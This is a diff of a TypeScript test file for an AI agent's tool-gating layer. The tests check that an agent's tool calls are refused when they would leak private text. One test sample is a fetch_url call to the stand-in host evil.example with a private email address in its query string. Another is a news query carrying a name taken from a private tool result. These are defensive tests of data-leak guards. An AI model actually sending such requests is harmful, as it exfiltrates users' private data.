@@ -98,17 +98,18 @@ test("gated: decide() refusals never run the tool (Stop-all, link taint, skill l
   const run = async () => { ran++; return "ran"; };
   const steps: string[] = [];
   assert.match((await gated("ask_agent", { agent: "atlas", request: "x" }, base({ stopAll: true }), steps, run)).out, /^Error: /);
-  // pinned notes in context: only links the user typed may be opened
-  assert.match((await gated("fetch_url", { url: "https://evil.example/?q=secret" }, base({ pins: true }), steps, run)).out, /^Error: /);
+  // pinned notes in context: a URL carrying their text is refused
+  assert.match((await gated("fetch_url", { url: "https://evil.example/?q=mari%40tamm.ee" }, base({ pins: true, privateText: ["mari@tamm.ee"] }), steps, run)).out, /^Error: /);
   assert.match((await gated("read_news", { query: "x" }, base(), steps, run, "[SKILL demo · tools: fetch_url]\n")).out, /this skill may only use fetch_url/);
   assert.match((await gated("Bash", {}, base(), steps, run)).out, /unknown tool/);
   assert.equal(ran, 0);
   assert.equal(steps.length, 4); // refusals are still steps, as in core.ts
 });
 
-test("gated: earlier steps feed decide(): a private tool result turns news off for the rest of the turn", async () => {
-  const steps = [stepLine("week_review", {}, "private")];
-  assert.match((await gated("read_news", { query: "x" }, base(), steps, async () => "ran")).out, /private files/);
+test("gated: earlier steps feed decide(): a private tool result is checked against outgoing news queries", async () => {
+  const steps = [stepLine("week_review", {}, "Mari Tamm slipped the invoice")];
+  assert.match((await gated("read_news", { query: "Mari Tamm" }, base(), steps, async () => "ran")).out, /private text out: "Mari Tamm"/);
+  assert.equal((await gated("read_news", { query: "Estonian construction news" }, base(), steps, async () => "ran")).out, "ran");
 });
 
 test("gated: a thrown tool error becomes an Error: result", async () => {
